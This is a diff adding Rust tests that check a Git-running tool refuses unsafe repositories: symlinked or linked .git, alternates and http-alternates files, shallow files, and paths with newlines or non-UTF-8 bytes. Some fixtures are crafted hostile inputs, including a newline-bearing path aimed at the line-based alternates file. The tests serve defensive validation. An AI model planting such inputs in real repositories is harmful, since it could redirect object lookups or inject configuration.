+    fn the_cut_writes_exactly_the_boundary_as_shallow() {
+        // ADR 0012 D3.3 and plant bound-shallow-not-written: whether a missing shallow file refuses a
+        // run depends on the Git build (Train B2, receipt b7797a70: the gate image's Git passed the
+        // redundant-merge row without it). This holds the file itself.
+        let dir = scratch("bound-cut");
+        let (a, b) = ("1".repeat(40), "2".repeat(40));
+        super::child::cut_in(&[a.clone(), b.clone()], &dir).unwrap();
+        assert_eq!(
+            std::fs::read_to_string(dir.join("shallow")).unwrap(),
+            format!("{a}\n{b}\n")
+        );
+        let none = scratch("bound-cut-none");
+        super::child::cut_in(&[], &none).unwrap();
+        assert!(
+            !none.join("shallow").exists(),
+            "a root merge base leaves no boundary and no file"
+        );
+    }
+
+    #[test]
+    fn init_flags_are_pinned() {
+        // ADR 0012 D3.1 and acceptance item 8 ("--template= removed"): a pinned shape, because the
+        // template has no effect on the bytes in a cleared environment.
+        assert_eq!(
+            super::child::INIT_FLAGS,
+            ["init", "--quiet", "--bare", "--template="]
+        );
+    }
+
+    #[test]
+    fn bound_mode_admits_only_a_plain_repository() {
+        use super::child::{BoundFailure, RepositoryRefusal as R, admit_repository};
+        let work = Repo::new("bound-admit-work", "sha1");
+        work.commit("a.txt", "a\n");
+        assert_eq!(
+            admit_repository(&work.dir).unwrap(),
+            work.dir.canonicalize().unwrap().join(".git/objects")
+        );
+        let bare = scratch("bound-admit-bare");
+        assert!(
+            command("/usr/bin/git")
+                .args(["init", "-q", "--bare"])
+                .arg(&bare)
+                .status()
+                .unwrap()
+                .success()
+        );
+        assert_eq!(
+            admit_repository(&bare).unwrap(),
+            bare.canonicalize().unwrap().join("objects")
+        );
+        // Each refusal by its own variant (REFUSAL_MAP rows), and its message.
+        let refused = |dir: &Path, variant: R, part: &str| {
+            let failure = admit_repository(dir).unwrap_err();
+            assert_eq!(failure, BoundFailure::Repository(variant), "{dir:?}");
+            assert!(failure.to_string().contains(part), "{dir:?}: {failure}");
+        };
+        // A linked worktree: .git is a file.
+        let linked = scratch("bound-admit-linked");
+        std::fs::remove_dir(&linked).unwrap();
+        work.git(&["worktree", "add", "-q", linked.to_str().unwrap()]);
+        refused(&linked, R::GitFile, "git-common-dir");
+        // A symlinked .git.
+        let link = scratch("bound-admit-symlink");
+        std::os::unix::fs::symlink(work.dir.join(".git"), link.join(".git")).unwrap();
+        refused(&link, R::GitSymlink, "symlink");
+        // A caller's alternates file and a caller's shallow file.
+        let alt = Repo::new("bound-admit-alternates", "sha1");
+        alt.commit("a.txt", "a\n");
+        std::fs::write(
+            alt.dir.join(".git/objects/info/alternates"),
+            b"/elsewhere\n",
+        )
+        .unwrap();
+        refused(&alt.dir, R::Alternates, "alternates");
+        let http = Repo::new("bound-admit-http-alternates", "sha1");
+        http.commit("a.txt", "a\n");
+        std::fs::write(
+            http.dir.join(".git/objects/info/http-alternates"),
+            b"https://example.invalid/objects\n",
+        )
+        .unwrap();
+        refused(&http.dir, R::Alternates, "http-alternates");
+        // A symlinked objects directory.
+        let linked_objects = Repo::new("bound-admit-objects-link", "sha1");
+        linked_objects.commit("a.txt", "a\n");
+        let moved = linked_objects.dir.join("objects-elsewhere");
+        std::fs::rename(linked_objects.dir.join(".git/objects"), &moved).unwrap();
+        std::os::unix::fs::symlink(&moved, linked_objects.dir.join(".git/objects")).unwrap();
+        refused(&linked_objects.dir, R::ObjectsMissing, "objects directory");
+        let shallow = Repo::new("bound-admit-shallow", "sha1");
+        let id = shallow.commit("a.txt", "a\n");
+        std::fs::write(shallow.dir.join(".git/shallow"), format!("{id}\n")).unwrap();
+        refused(&shallow.dir, R::Shallow, "shallow");
+        // A newline in the path: the alternates file is line-based (review M2).
+        let parent = scratch("bound-admit-newline");
+        let odd = parent.join("a\nb");
+        std::fs::create_dir(&odd).unwrap();
+        assert!(
+            command("/usr/bin/git")
+                .args(["init", "-q", "--bare"])
+                .arg(&odd)
+                .status()
+                .unwrap()
+                .success()
+        );
+        refused(&odd, R::PathCharacters, "control character");
+        // A path that is not UTF-8.
+        let raw = {
+            use std::os::unix::ffi::OsStrExt as _;
+            parent.join(std::ffi::OsStr::from_bytes(b"bad-\xff-name"))
+        };
+        std::fs::create_dir(&raw).unwrap();
+        refused(&raw, R::NotUtf8, "not UTF-8");
+        // Not a repository at all, and half a bare repository (objects without HEAD, HEAD without
+        // objects): a bare repository needs both.
+        refused(
+            &scratch("bound-admit-empty"),
+            R::NotARepository,
+            "not a Git repository",
+        );
+        let objects_only = scratch("bound-admit-objects-only");
+        std::fs::create_dir(objects_only.join("objects")).unwrap();
+        refused(&objects_only, R::NotARepository, "not a Git repository");
+        let head_only = scratch("bound-admit-head-only");
+        std::fs::write(head_only.join("HEAD"), b"ref: refs/heads/main\n").unwrap();
+        refused(&head_only, R::NotARepository, "not a Git repository");
+    }
 }
 
 #[cfg(test)]
